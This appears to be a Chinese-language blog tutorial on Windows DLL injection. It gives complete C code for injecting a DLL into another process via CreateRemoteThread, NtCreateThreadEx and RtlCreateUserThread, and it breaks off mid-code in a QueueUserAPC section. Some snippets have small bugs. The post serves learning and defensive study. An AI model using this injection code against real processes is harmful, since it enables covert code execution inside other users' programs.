DLL注入</h2><p>DLL注入就是让进程加载我们构造的DLL文件，执行代码。与PE注入不同的是，DLL的注入是动态的，是在内存中进行操作的，相对来说复杂一些，网上提到最多的基本就是这四种，其他还有一些特殊利用以后遇到的话再补充。<br>参考了<em><strong>injectAllTheThings</strong></em>项目，本来是用Python写的，但是要处理32位程序的话不太方便，于是用C又写了一遍，没啥耐心了，大部分代码都是借鉴这个项目。</p><h3 id="2-1-创建远程线程"><a href="#2-1-创建远程线程" class="headerlink" title="2.1 创建远程线程"></a>2.1 创建远程线程</h3><h4 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread"></a>CreateRemoteThread</h4><p>通过在目标进程的内存中写入DLL的绝对路径，然后调用CreateRemoteThread函数，将LoadLibrary作为回调函数传入，内存中的DLL路径地址作为回调函数的参数，以此实现DLL的注入。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"headers.h"</span></span><span class="token keyword">void</span> <span class="token function">demoCreateRemoteThread</span><span class="token punctuation">(</span>LPCSTR pszDllPath<span class="token punctuation">,</span> DWORD dwPid<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> DWORD dwSize <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pszDllPath<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 打开进程</span> HANDLE hProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_ALL_ACCESS<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> dwPid<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>hProcess <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Open process failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">//printf("Path Length：%d\n", dwSize);</span> <span class="token comment">// 开辟内存</span> LPVOID pszDllAddr <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> dwSize<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pszDllAddr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] VirtualAllocEx failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 写入内存</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pszDllAddr<span class="token punctuation">,</span> pszDllPath<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pszDllPath<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Write process memory failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 获取LoadLibraryA函数地址</span> PROC pfnProcAddr<span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"Kernel32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"LoadLibraryA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pfnProcAddr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] GetProcAddress failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 创建远程线程</span> HANDLE hThread <span class="token operator">=</span> <span class="token function">CreateRemoteThread</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token punctuation">(</span>LPTHREAD_START_ROUTINE<span class="token punctuation">)</span>pfnProcAddr<span class="token punctuation">,</span> pszDllAddr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>hThread <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Create remote thread failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Inject DLL by CreateRemoteThread success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hThread<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">VirtualFreeEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pszDllAddr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="NtCreateThreadEx"><a href="#NtCreateThreadEx" class="headerlink" title="NtCreateThreadEx"></a>NtCreateThreadEx</h4><p>这是一个未公开的API，需要自己定义函数结构体：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token function">NTSTATUS</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> LPFUN_NtCreateThreadEx<span class="token punctuation">)</span> <span class="token punctuation">(</span> PHANDLE hThread<span class="token punctuation">,</span> ACCESS_MASK DesiredAccess<span class="token punctuation">,</span> LPVOID ObjectAttributes<span class="token punctuation">,</span> HANDLE ProcessHandle<span class="token punctuation">,</span> LPTHREAD_START_ROUTINE lpStartAddress<span class="token punctuation">,</span> LPVOID lpParameter<span class="token punctuation">,</span> BOOL CreateSuspended<span class="token punctuation">,</span> ULONG StackZeroBits<span class="token punctuation">,</span> ULONG SizeOfStackCommit<span class="token punctuation">,</span> ULONG SizeOfStackReserve<span class="token punctuation">,</span> LPVOID lpBytesBuffer<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注入原理和CreateRemoteThread类似，也是通过创建远程线程：</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"headers.h"</span></span><span class="token keyword">void</span> <span class="token function">demoNtCreateThreadEx</span><span class="token punctuation">(</span>LPCSTR pszDllPath<span class="token punctuation">,</span> DWORD dwPid<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> HANDLE hRemoteThread <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> DWORD dwSize <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pszDllPath<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 打开进程</span> HANDLE hProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_ALL_ACCESS<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> dwPid<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>hProcess <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Open process failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 开辟内存</span> LPVOID pszDllAddr <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> dwSize<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_EXECUTE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pszDllAddr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] VirtualAllocEx failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 写入内存</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pszDllAddr<span class="token punctuation">,</span> pszDllPath<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pszDllPath<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Write process memory failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 获取LoadLibraryA函数地址</span> PROC pfnProcAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"Kernel32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"LoadLibraryA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pfnProcAddr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] GetProcAddress failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 获取NtCreateThreadEx函数地址</span> PROC pfnNtCreateThreadEx <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandle</span><span class="token punctuation">(</span><span class="token function">TEXT</span><span class="token punctuation">(</span><span class="token string">"ntdll.dll"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"NtCreateThreadEx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pfnNtCreateThreadEx <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Get NtCreateThreadEx Address failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> LPFUN_NtCreateThreadEx funNtCreateThreadEx <span class="token operator">=</span> <span class="token punctuation">(</span>LPFUN_NtCreateThreadEx<span class="token punctuation">)</span>pfnNtCreateThreadEx<span class="token punctuation">;</span> NTSTATUS status <span class="token operator">=</span> <span class="token function">funNtCreateThreadEx</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>hRemoteThread<span class="token punctuation">,</span> <span class="token number">0x1FFFFF</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> hProcess<span class="token punctuation">,</span> <span class="token punctuation">(</span>PTHREAD_START_ROUTINE<span class="token punctuation">)</span>pfnProcAddr<span class="token punctuation">,</span>  pszDllAddr<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>status<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Call NtCreateThreadEx failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Inject DLL by NtCreateThreadEx success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">VirtualFreeEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pszDllAddr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="RtlCreateUserThread"><a href="#RtlCreateUserThread" class="headerlink" title="RtlCreateUserThread"></a>RtlCreateUserThread</h4><p>对NtCreateThreadEx函数的封装，也是未公开的API。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">typedef</span> <span class="token function">DWORD</span><span class="token punctuation">(</span>WINAPI<span class="token operator">*</span> LPFUN_RtlCreateUserThread<span class="token punctuation">)</span><span class="token punctuation">(</span> IN HANDLE ProcessHandle<span class="token punctuation">,</span> IN PSECURITY_DESCRIPTOR SecurityDescriptor<span class="token punctuation">,</span> IN BOOL CreateSuspended<span class="token punctuation">,</span> IN ULONGStackZeroBits<span class="token punctuation">,</span> IN OUT PULONGStackReserved<span class="token punctuation">,</span> IN OUT PULONGStackCommit<span class="token punctuation">,</span> IN LPVOIDStartAddress<span class="token punctuation">,</span> IN LPVOIDStartParameter<span class="token punctuation">,</span> OUT HANDLE ThreadHandle<span class="token punctuation">,</span> OUT LPVOIDClientID<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"headers.h"</span></span><span class="token keyword">void</span> <span class="token function">demoRtlCreateUserThread</span><span class="token punctuation">(</span>LPCSTR pszDllPath<span class="token punctuation">,</span> DWORD dwPid<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> HANDLE hRemoteThread <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span> DWORD dwSize <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pszDllPath<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 打开进程</span> HANDLE hProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_ALL_ACCESS<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> dwPid<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>hProcess <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Open process failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 开辟内存</span> LPVOID pszDllAddr <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> dwSize<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pszDllAddr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] VirtualAllocEx failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 写入内存</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pszDllAddr<span class="token punctuation">,</span> pszDllPath<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pszDllPath<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Write process memory failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 获取LoadLibraryA函数地址</span> PROC pfnProcAddr <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"Kernel32.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"LoadLibraryA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pfnProcAddr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] GetProcAddress failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> PROC pfnRtlCreateUserThread <span class="token operator">=</span> <span class="token function">GetProcAddress</span><span class="token punctuation">(</span><span class="token function">GetModuleHandleA</span><span class="token punctuation">(</span><span class="token string">"ntdll.dll"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"RtlCreateUserThread"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pfnRtlCreateUserThread <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Get pfnRtlCreateUserThread Address failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> LPFUN_RtlCreateUserThread funRtlCreateUserThread <span class="token operator">=</span> <span class="token punctuation">(</span>LPFUN_RtlCreateUserThread<span class="token punctuation">)</span>pfnRtlCreateUserThread<span class="token punctuation">;</span> DWORD status <span class="token operator">=</span> <span class="token function">funRtlCreateUserThread</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span>   pfnProcAddr<span class="token punctuation">,</span> pszDllAddr<span class="token punctuation">,</span> <span class="token operator">&amp;</span>hRemoteThread<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>status<span class="token operator">!=</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Call RtlCreateUserThread failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] Inject DLL by RtlCreateUserThread success!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">VirtualFreeEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pszDllAddr<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> MEM_RELEASE<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-线程劫持"><a href="#2-2-线程劫持" class="headerlink" title="2.2 线程劫持"></a>2.2 线程劫持</h3><h4 id="QueueUserAPC"><a href="#QueueUserAPC" class="headerlink" title="QueueUserAPC"></a>QueueUserAPC</h4><p>通过添加线程的APC队列，使得线程被再次执行时会调用APC队列中的函数。并不是每个线程都会被执行，在注入时可以向目标进程的所有线程中都注入一次，我测试的是Sublime_Text，注入所有线程后可以稳定触发。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;windows.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;tlhelp32.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">"headers.h"</span></span><span class="token keyword">void</span> <span class="token function">demoQueueUserAPC</span><span class="token punctuation">(</span>LPCSTR pszDllPath<span class="token punctuation">,</span> DWORD dwPid<span class="token punctuation">)</span><span class="token punctuation">&#123;</span> DWORD dwSize <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>pszDllPath<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 打开进程</span> HANDLE hProcess <span class="token operator">=</span> <span class="token function">OpenProcess</span><span class="token punctuation">(</span>PROCESS_ALL_ACCESS<span class="token punctuation">,</span> FALSE<span class="token punctuation">,</span> dwPid<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>hProcess <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] Open process failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 开辟内存</span> LPVOID pszDllAddr <span class="token operator">=</span> <span class="token function">VirtualAllocEx</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> dwSize<span class="token punctuation">,</span> MEM_COMMIT<span class="token punctuation">,</span> PAGE_READWRITE<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>pszDllAddr <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[!] VirtualAllocEx failed: %lu\n"</span><span class="token punctuation">,</span> <span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">CloseHandle</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token comment">// 写入内存</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">WriteProcessMemory</span><span class="token punctuation">(</span>hProcess<span class="token punctuation">,</span> pszDllAddr<span class="token punctuation">,</span> pszDllPath<span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token 